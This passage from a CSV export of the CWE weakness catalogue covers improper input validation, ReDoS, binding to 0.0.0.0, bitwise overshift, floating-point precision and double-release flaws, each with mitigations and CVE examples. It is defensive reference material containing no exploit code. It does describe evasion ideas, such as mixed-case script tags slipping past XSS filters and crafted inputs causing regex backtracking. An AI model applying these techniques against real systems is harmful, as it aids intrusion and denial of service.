asynchronously (asynchronous message passing) as opposed to executing them synchronously at the time each event fires. The untrusted code should execute at the start of the next iteration of the thread's message loop. In this way, calls into non-reentrant code are strictly serialized, so that each operation completes fully before the next operation begins. Special attention must be paid to all places where type coercion may result in script execution. Performing all needed coercions at the very beginning of an operation can help reduce the chance of operations executing at unexpected junctures.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Make sure the code (e.g., function or class) in question is reentrant by not leveraging non-local data, not modifying its own code, and not calling other non-reentrant code.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2014-1772:DESCRIPTION:In this vulnerability, by registering a malicious onerror handler, an adversary can produce unexpected re-entrance of a CDOMRange object. [REF-1098]:LINK:https://www.cve.org/CVERecord?id=CVE-2014-1772::REFERENCE:CVE-2018-8174:DESCRIPTION:This CVE covers several vulnerable scenarios enabled by abuse of the Class_Terminate feature in Microsoft VBScript. In one scenario, Class_Terminate is used to produce an undesirable re-entrance of ScriptingDictionary during execution of that object's destructor. In another scenario, a vulnerable condition results from a recursive entrance of a property setter method. This recursive invocation produces a second, spurious call to the Release method of a reference-counted object, causing a UAF when that object is freed prematurely. This vulnerability pattern has been popularized as Double Kill. [REF-1099]:LINK:https://www.cve.org/CVERecord?id=CVE-2018-8174::\",,,\"\",::74::,\"\",\n1284,\"Improper Validation of Specified Quantity in Input\",Base,Incomplete,\"The product receives input that is expected to specify a quantity (such as size or length), but it does not validate or incorrectly validates that the quantity has the required properties.\",\"Specified quantities include size, length, frequency, price, rate, number of operations, time, and others. Code may rely on specified quantities to allocate resources, perform calculations, control iteration, etc. When the quantity is not properly validated, then attackers can specify malicious quantities to cause excessive resource allocation, trigger unexpected failures, enable buffer overflows, etc.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:20:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:789:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context:NOTE:Since quantities are used so often to affect resource allocation or process financial data, they are often present in many places in the code.::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2022-21668:DESCRIPTION:Chain: Python library does not limit the resources used to process images that specify a very large number of bands (CWE-1284), leading to excessive memory consumption (CWE-789) or an integer overflow (CWE-190).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-21668::REFERENCE:CVE-2008-1440:DESCRIPTION:lack of validation of length field leads to infinite loop:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1440::REFERENCE:CVE-2008-2374:DESCRIPTION:lack of validation of string length fields allows memory consumption or buffer over-read:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2374::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1285,\"Improper Validation of Specified Index, Position, or Offset in Input\",Base,Incomplete,\"The product receives input that is expected to specify an index, position, or offset into an indexable resource such as a buffer or file, but it does not validate or incorrectly validates that the specified index/position/offset has the required properties.\",\"Often, indexable resources such as memory buffers or files can be accessed using a specific position, index, or offset, such as an index for an array or a position for a file. When untrusted input is not properly validated before it is used as an index, attackers could access (or attempt to access) unauthorized portions of these resources. This could be used to cause buffer overflows, excessive resource allocation, or trigger unexpected failures.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2005-0369:DESCRIPTION:large ID in packet used as array index:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0369::REFERENCE:CVE-2001-1009:DESCRIPTION:negative array index as argument to POP LIST command:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1009::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1286,\"Improper Validation of Syntactic Correctness of Input\",Base,Incomplete,\"The product receives input that is expected to be well-formed - i.e., to comply with a certain syntax - but it does not validate or incorrectly validates that the input complies with the syntax.\",\"Often, complex inputs are expected to follow a particular syntax, which is either assumed by the input itself, or declared within metadata such as headers. The syntax could be for data exchange formats, markup languages, or even programming languages. When untrusted input is not properly validated for the expected syntax, attackers could cause parsing failures, trigger unexpected errors, or expose latent vulnerabilities that might not be directly exploitable if the input had conformed to the syntax.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2016-4029:DESCRIPTION:Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).:LINK:https://www.cve.org/CVERecord?id=CVE-2016-4029::REFERENCE:CVE-2007-5893:DESCRIPTION:HTTP request with missing protocol version number leads to crash:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5893::\",,,\"\",::66::676::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1287,\"Improper Validation of Specified Type of Input\",Base,Incomplete,\"The product receives input that is expected to be of a certain type, but it does not validate or incorrectly validates that the input is actually of the expected type.\",\"When input does not comply with the expected type, attackers could trigger unexpected errors, cause incorrect actions to take place, or exploit latent vulnerabilities that would not be possible if the input conformed with the expected type. This weakness can appear in type-unsafe programming languages, or in programming languages that support casting or conversion of an input to another type.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:843:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2024-37032:DESCRIPTION:Large language model (LLM) management tool does not validate the format of a digest value (CWE-1287) from a private, untrusted model registry, enabling relative path traversal (CWE-23), a.k.a. Probllama:LINK:https://www.cve.org/CVERecord?id=CVE-2024-37032::REFERENCE:CVE-2008-2223:DESCRIPTION:SQL injection through an ID that was supposed to be numeric.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2223::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1288,\"Improper Validation of Consistency within Input\",Base,Incomplete,\"The product receives a complex input with multiple elements or fields that must be consistent with each other, but it does not validate or incorrectly validates that the input is actually consistent.\",\"Some input data can be structured with multiple elements or fields that must be consistent with each other, e.g. a number-of-items field that is followed by the expected number of elements. When such complex inputs are inconsistent, attackers could trigger unexpected errors, cause incorrect actions to take place, or exploit latent vulnerabilities.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2018-16733:DESCRIPTION:product does not validate that the start block appears before the end block:LINK:https://www.cve.org/CVERecord?id=CVE-2018-16733::REFERENCE:CVE-2006-3790:DESCRIPTION:size field that is inconsistent with packet size leads to buffer over-read:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3790::REFERENCE:CVE-2008-4114:DESCRIPTION:system crash with offset value that is inconsistent with packet size:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4114::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1289,\"Improper Validation of Unsafe Equivalence in Input\",Base,Incomplete,\"The product receives an input value that is used as a resource identifier or other type of reference, but it does not validate or incorrectly validates that the input is equivalent to a potentially-unsafe value.\",\"Attackers can sometimes bypass input validation schemes by finding inputs that appear to be safe, but will be dangerous when processed at a lower layer or by a downstream component. For example, a simple XSS protection mechanism might try to validate that an input has no <script> tags using case-sensitive matching, but since HTML is case-insensitive when processed by web browsers, an attacker could inject <ScrIpT> and trigger XSS.\",::NATURE:ChildOf:CWE ID:20:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:41:VIEW ID:1000::NATURE:PeerOf:CWE ID:178:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Often::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2021-39155:DESCRIPTION:Chain: A microservice integration and management platform compares the hostname in the HTTP Host header in a case-sensitive way (CWE-178, CWE-1289), allowing bypass of the authorization policy (CWE-863) using a hostname with mixed case or other variations.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-39155::REFERENCE:CVE-2020-11053:DESCRIPTION:Chain: Go-based Oauth2 reverse proxy can send the authenticated user to another site at the end of the authentication flow. A redirect URL with HTML-encoded whitespace characters can bypass the validation (CWE-1289) to redirect to a malicious site (CWE-601):LINK:https://www.cve.org/CVERecord?id=CVE-2020-11053::REFERENCE:CVE-2005-0269:DESCRIPTION:File extension check in forum software only verifies extensions that contain all lowercase letters, which allows remote attackers to upload arbitrary files via file extensions that include uppercase letters.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0269::REFERENCE:CVE-2001-1238:DESCRIPTION:Task Manager does not allow local users to end processes with uppercase letters named (1) winlogon.exe, (2) csrss.exe, (3) smss.exe and (4) services.exe via the Process tab which could allow local users to install Trojan horses that cannot be stopped.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1238::REFERENCE:CVE-2004-2214:DESCRIPTION:HTTP server allows bypass of access restrictions using URIs with mixed case.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2214::\",,,\"\",,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1322,\"Use of Blocking Code in Single-threaded, Non-blocking Context\",Base,Incomplete,\"The product uses a non-blocking model that relies on a single threaded process for features such as scalability, but it contains code that can block when it is invoked.\",\"When an attacker can directly invoke the blocking code, or the blocking code can be affected by environmental conditions that can be influenced by an attacker, then this can lead to a denial of service by causing unexpected hang or freeze of the code. Examples of blocking code might be an expensive computation or calling blocking library calls, such as those that perform exclusive file operations or require a successful network operation. Due to limitations in multi-thread models, single-threaded models are used to overcome the resource constraints that are caused by using many threads. In such a model, all code should generally be non-blocking. If blocking code is called, then the event loop will effectively be stopped, which can be undesirable or dangerous. Such models are used in Python asyncio, Vert.x, and Node.js, or other custom event loop code.\",::NATURE:ChildOf:CWE ID:834:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:835:VIEW ID:1000:ORDINAL:Primary::,\"\",,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):NOTE:An unexpected call to blocking code can trigger an infinite loop, or a large loop that causes the software to pause and wait indefinitely.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Generally speaking, blocking calls should be replaced with non-blocking alternatives that can be used asynchronously. Expensive computations should be passed off to worker threads, although the correct approach depends on the framework being used.::PHASE:Implementation:DESCRIPTION:For expensive computations, consider breaking them up into multiple smaller computations. Refer to the documentation of the framework being used for guidance.::\",\"\",,,\"\",::25::,\"\",\n1327,\"Binding to an Unrestricted IP Address\",Base,Incomplete,\"The product assigns the address 0.0.0.0 for a database server, a cloud service/instance, or any computing resource that communicates remotely.\",\"When a server binds to the address 0.0.0.0, it allows connections from every IP address on the local machine, effectively exposing the server to every possible network. This might be much broader access than intended by the developer or administrator, who might only be expecting the server to be reachable from a single interface/network.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Other:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Web Server:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Client Server:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:System Configuration::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Amplification:LIKELIHOOD:High::\",\"\",\"::PHASE:System Configuration:DESCRIPTION:Assign IP addresses that are not 0.0.0.0.:EFFECTIVENESS:High::PHASE:System Configuration:STRATEGY:Firewall:DESCRIPTION:Unwanted connections to the configured server may be denied through a firewall or other packet filtering measures.:EFFECTIVENESS:High::\",\"::REFERENCE:CVE-2022-21947:DESCRIPTION:Desktop manager for Kubernetes and container management binds a service to 0.0.0.0, allowing users on the network to make requests to a dashboard API.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-21947::\",,,\"\",::1::,\"\",\n1333,\"Inefficient Regular Expression Complexity\",Base,Draft,\"The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles.\",\"Some regular expression engines have a feature called backtracking. If the token cannot match, the engine backtracks to a position that may result in a different token that can match. Backtracking becomes a weakness if all of these conditions are met: The number of possible backtracking attempts are exponential relative to the length of the input. The input can fail to match the regular expression. The input can be long enough. Attackers can create crafted inputs that intentionally cause the regular expression to use excessive backtracking in a way that causes the CPU consumption to spike.\",::NATURE:ChildOf:CWE ID:407:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:407:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:ReDoS:DESCRIPTION:ReDoS is an abbreviation of Regular expression Denial of Service.::TERM:Regular Expression Denial of Service:DESCRIPTION:While this term is attack-focused, this is commonly used to describe the weakness.::TERM:Catastrophic backtracking:DESCRIPTION:This term is used to describe the behavior of the regular expression as a negative technical impact.::\",\"::PHASE:Implementation:NOTE:A RegEx can be easy to create and read using unbounded matching characters, but the programmer might not consider the risk of excessive backtracking.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Resource Consumption (CPU):LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use regular expressions that do not support backtracking, e.g. by removing nested quantifiers.:EFFECTIVENESS:High::PHASE:System Configuration:DESCRIPTION:Set backtracking limits in the configuration of the regular expression implementation, such as PHP's pcre.backtrack_limit. Also consider limits on execution time for the process.:EFFECTIVENESS:Moderate::PHASE:Implementation:DESCRIPTION:Do not use regular expressions with untrusted input. If regular expressions must be used, avoid using backtracking in the expression.:EFFECTIVENESS:High::PHASE:Implementation:DESCRIPTION:Limit the length of the input that the regular expression will process.:EFFECTIVENESS:Moderate::\",\"::REFERENCE:CVE-2020-5243:DESCRIPTION:server allows ReDOS with crafted User-Agent strings, due to overlapping capture groups that cause excessive backtracking.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-5243::REFERENCE:CVE-2021-21317:DESCRIPTION:npm package for user-agent parser prone to ReDoS due to overlapping capture groups:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21317::REFERENCE:CVE-2019-16215:DESCRIPTION:Markdown parser uses inefficient regex when processing a message, allowing users to cause CPU consumption and delay preventing processing of other messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-16215::REFERENCE:CVE-2019-6785:DESCRIPTION:Long string in a version control product allows DoS due to an inefficient regex.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-6785::REFERENCE:CVE-2019-12041:DESCRIPTION:Javascript code allows ReDoS via a long string due to excessive backtracking.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-12041::REFERENCE:CVE-2015-8315:DESCRIPTION:ReDoS when parsing time.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-8315::REFERENCE:CVE-2015-8854:DESCRIPTION:ReDoS when parsing documents.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-8854::REFERENCE:CVE-2017-16021:DESCRIPTION:ReDoS when validating URL.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-16021::\",,,\"\",::492::,\"\",\n1335,\"Incorrect Bitwise Shift of Integer\",Base,Draft,\"An integer value is specified to be shifted by a negative amount or an amount greater than or equal to the number of bits contained in the value causing an unexpected or indeterminate result.\",\"Specifying a value to be shifted by a negative amount is undefined in various languages. Various computer architectures implement this action in different ways. The compilers and interpreters when generating code to accomplish a shift generally do not do a check for this issue. Specifying an over-shift, a shift greater than or equal to the number of bits contained in a value to be shifted, produces a result which varies by architecture and compiler. In some languages, this action is specifically listed as producing an undefined result.\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:JavaScript:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Adding shifts without properly verifying the size and sign of the shift amount.::\",\"\",,\"::SCOPE:Integrity:IMPACT:DoS: Crash, Exit, or Restart::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Implicitly or explicitly add checks and mitigation for negative or over-shift values.::\",\"::REFERENCE:CVE-2009-4307:DESCRIPTION:An unexpected large value in the ext4 filesystem causes an overshift condition resulting in a divide by zero.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-4307::REFERENCE:CVE-2012-2100:DESCRIPTION:An unexpected large value in the ext4 filesystem causes an overshift condition resulting in a divide by zero - fix of CVE-2009-4307.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-2100::REFERENCE:CVE-2020-8835:DESCRIPTION:An overshift in a kernel allowed out of bounds reads and writes resulting in a root takeover.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-8835::REFERENCE:CVE-2015-1607:DESCRIPTION:Program is not properly handling signed bitwise left-shifts causing an overlapping memcpy memory range error.:LINK:https://www.cve.org/CVERecord?id=CVE-2015-1607::REFERENCE:CVE-2016-9842:DESCRIPTION:Compression function improperly executes a signed left shift of a negative integer.:LINK:https://www.cve.org/CVERecord?id=CVE-2016-9842::REFERENCE:CVE-2018-18445:DESCRIPTION:Some kernels improperly handle right shifts of 32 bit numbers in a 64 bit register.:LINK:https://www.cve.org/CVERecord?id=CVE-2018-18445::REFERENCE:CVE-2013-4206:DESCRIPTION:Putty has an incorrectly sized shift value resulting in an overshift.:LINK:https://www.cve.org/CVERecord?id=CVE-2013-4206::REFERENCE:CVE-2018-20788:DESCRIPTION:LED driver overshifts under certain conditions resulting in a DoS.:LINK:https://www.cve.org/CVERecord?id=CVE-2018-20788::\",,,\"\",,\"\",\n1339,\"Insufficient Precision or Accuracy of a Real Number\",Base,Draft,\"The product processes a real number with an implementation in which the number's representation does not preserve required accuracy and precision in its fractional part, causing an incorrect result.\",\"When a security decision or calculation requires highly precise, accurate numbers such as financial calculations or prices, then small variations in the number could be exploited by an attacker. There are multiple ways to store the fractional part of a real number in a computer. In all of these cases, there is a limit to the accuracy of recording a fraction. If the fraction can be represented in a fixed number of digits (binary or decimal), there might not be enough digits assigned to represent the number. In other cases the number cannot be represented in a fixed number of digits due to repeating in decimal or binary notation (e.g. 0.333333...) or due to a transcendental number such as Π or √2. Rounding of numbers can lead to situations where the computer results do not adequately match the result of sufficiently accurate math.\",::NATURE:ChildOf:CWE ID:682:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:190:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:834:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:119:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"::There are three major ways to store real numbers in computers. Each method is described along with the limitations of how they store their numbers. Fixed: Some implementations use a fixed number of binary bits to represent both the integer and the fraction. In the demonstrative example about Muller's Recurrence, the fraction 108.0 - ((815.0 - 1500.0 / z) / y) cannot be represented in 8 binary digits. The numeric accuracy within languages such as PL/1, COBOL and Ada is expressed in decimal digits rather than binary digits. In SQL and most databases, the length of the integer and the fraction are specified by the programmer in decimal. In the language C, fixed reals are implemented according to ISO/IEC TR18037 Floating: The number is stored in a version of scientific notation with a fixed length for the base and the significand. This allows flexibility for more accuracy when the integer portion is smaller. When dealing with large integers, the fractional accuracy is less. Languages such as PL/1, COBOL and Ada set the accuracy by decimal digit representation rather than using binary digits. Python also implements decimal floating-point numbers using the IEEE 754-2008 encoding method. Ratio: The number is stored as the ratio of two integers. These integers also have their limits. These integers can be stored in a fixed number of bits or in a vector of digits. While the vector of digits method provides for very large integers, they cannot truly represent a repeating or transcendental number as those numbers do not ever have a fixed length.::\",\"\",\"::PHASE:Implementation:NOTE:This weakness is introduced when the developer picks a method to represent a real number. The weakness may only be visible with very specific numeric inputs.::\",\"\",,\"::SCOPE:Availability:IMPACT:DoS: Crash, Exit, or Restart:NOTE:This weakness will generally lead to undefined results and therefore crashes. In some implementations the program will halt if the weakness causes an overflow during a calculation.::SCOPE:Integrity:IMPACT:Execute Unauthorized Code or Commands:NOTE:The results of the math are not as expected. This could cause issues where a value would not be properly calculated and provide an incorrect answer.::SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Read Application Data:IMPACT:Modify Application Data:NOTE:This weakness can sometimes trigger buffer overflows which can be used to execute arbitrary code. This is usually outside the scope of a product's implicit security policy.::\",\"\",\"::PHASE:Implementation Patching and Maintenance:DESCRIPTION:The developer or maintainer can move to a more accurate representation of real numbers. In extreme cases, the programmer can move to representations such as ratios of BigInts which can represent real numbers to extremely fine precision. The programmer can also use the concept of an Unum real. The memory and CPU tradeoffs of this change must be examined. Since floating point reals are used in many products and many locations, they are implemented in hardware and most format changes will cause the calculations to be moved into software resulting in slower products.::\",\"::REFERENCE:CVE-2018-16069:DESCRIPTION:Chain: series of floating-point precision errors (CWE-1339) in a web browser rendering engine causes out-of-bounds read (CWE-125), giving access to cross-origin data:LINK:https://www.cve.org/CVERecord?id=CVE-2018-16069::REFERENCE:CVE-2017-7619:DESCRIPTION:Chain: rounding error in floating-point calculations (CWE-1339) in image processor leads to infinite loop (CWE-835):LINK:https://www.cve.org/CVERecord?id=CVE-2017-7619::REFERENCE:CVE-2021-29529:DESCRIPTION:Chain: machine-learning product can have a heap-based buffer overflow (CWE-122) when some integer-oriented bounds are calculated by using ceiling() and floor() on floating point values (CWE-1339):LINK:https://www.cve.org/CVERecord?id=CVE-2021-29529::REFERENCE:CVE-2008-2108:DESCRIPTION:Chain: insufficient precision (CWE-1339) in random-number generator causes some zero bits to be reliably generated, reducing the amount of entropy (CWE-331):LINK:https://www.cve.org/CVERecord?id=CVE-2008-2108::REFERENCE:CVE-2006-6499:DESCRIPTION:Chain: web browser crashes due to infinite loop - bad looping logic [that relies on] floating point math [CWE-1339] to exit the loop [CWE-835]:LINK:https://www.cve.org/CVERecord?id=CVE-2006-6499::\",,,\"\",,\"\",\n1341,\"Multiple Releases of Same Resource or Handle\",Base,Incomplete,\"The product attempts to close or release a resource or handle more than once, without any successful open between the close operations.\",\"Code typically requires opening handles or references to resources such as memory, files, devices, socket connections, services, etc. When the code is finished with using the resource, it is typically expected to close or release the resource, which indicates to the environment (such as the OS) that the resource can be re-assigned or reused by unrelated processes or actors - or in some cases, within the same process. API functions or other abstractions are often used to perform this release, such as free() or delete() within C/C++, or file-handle close() operations that are used in many languages. Unfortunately, the implementation or design of such APIs might expect the developer to be responsible for ensuring that such APIs are only called once per release of the resource. If the developer attempts to release the same resource/handle more than once, then the API's expectations are not met, resulting in undefined and/or insecure behavior. This could lead to consequences such as memory corruption, data corruption, execution path corruption, or other consequences. Note that while the implementation for most (if not all) resource reservation allocations involve a unique identifier/pointer/symbolic reference, then if this identifier is reused, checking the identifier for resource closure may result in a false state of openness and closing of the wrong resource. For this reason, reuse of identifiers is discouraged.\",::NATURE:ChildOf:CWE ID:675:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:672:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Rust:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE 